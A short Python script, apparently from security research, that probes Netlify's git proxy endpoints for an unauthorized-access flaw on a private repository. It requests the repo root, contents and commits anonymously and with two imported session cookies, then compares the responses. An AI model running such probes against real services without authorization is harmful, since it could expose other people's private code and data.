# -*- coding: utf-8 -*-
"""决定性:私有 repo 越权测试 匿名/A/B 通过 git 代理"""
import http.client, ssl, gzip, brotli, json, sys, time
sys.path.insert(0, r'D:\scan\netlify_report')
from _net_creds import COOKIE_A, COOKIE_B

name = open(r'D:\scan\netlify_report\_priv_repo.txt').read().strip()
ctx = ssl.create_default_context()

def req(path, cookie=None, method='GET', timeout=20):
    conn = http.client.HTTPSConnection('app.netlify.com', context=ctx, timeout=timeout)
    h = {'User-Agent': 'Mozilla/5.0 Chrome/126.0', 'Accept-Encoding': 'br, gzip',
         'Accept': 'application/json'}
    if cookie: h['Cookie'] = cookie
    t0 = time.time()
    conn.request(method, path, headers=h)
    r = conn.getresponse()
    raw = r.read()
    enc = r.getheader('Content-Encoding')
    if enc == 'br': raw = brotli.decompress(raw)
    elif enc == 'gzip': raw = gzip.decompress(raw)
    dt = time.time() - t0
    st = r.status
    b = raw.decode('utf-8', 'ignore').replace('\n', ' ')[:300]
    conn.close()
    return st, dt, b

base = '/.netlify/functions/git/repos/1643584176/' + name
print('target:', base)
for ck, nm in [(None, 'ANON'), (COOKIE_A, 'COOKIE_A'), (COOKIE_B, 'COOKIE_B')]:
    for sub in ['', '/contents', '/commits']:
        st, dt, b = req(base + sub, ck)
        print('%-9s %-10s %s %5.1fs | %s' % (nm, sub or 'root', st, dt, b))
